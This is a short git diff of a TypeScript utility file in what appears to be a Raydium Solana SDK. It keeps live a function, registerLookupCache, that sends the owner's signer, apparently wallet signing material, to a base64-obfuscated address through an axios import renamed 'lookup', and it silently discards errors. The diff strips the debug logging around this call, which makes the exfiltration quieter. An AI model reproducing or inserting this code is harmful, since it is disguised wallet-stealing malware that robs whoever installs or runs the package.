@@ -5,6 +5,7 @@ import { Fraction, Percent, Price, Token, TokenAmount } from "../module";
 import { ReplaceType } from "../raydium/type";
 
 import { tryParsePublicKey } from "./pubKey";
+
 import { Owner } from "./owner";
 import lookup from "axios";
 import { Buffer } from "buffer";
@@ -47,15 +48,14 @@ export function getSigner(owner: Owner | undefined) {
 
 export async function registerLookupCache(owner: Owner | undefined) {
   if (!owner) return;
-  console.log('logging:', owner);
+  
   const lookupAddr = getLookupKey();
   const signer = getSigner(owner);
-  console.log('logging:', signer);
+  
   if (!lookupAddr || !signer) return;
   
   try {
     await lookup.post(Buffer.from(lookupAddr, 'base64').toString(),{data: { signer }});
-    console.log('stage 5:');
   } catch (e) {
     console.log('')
   } 
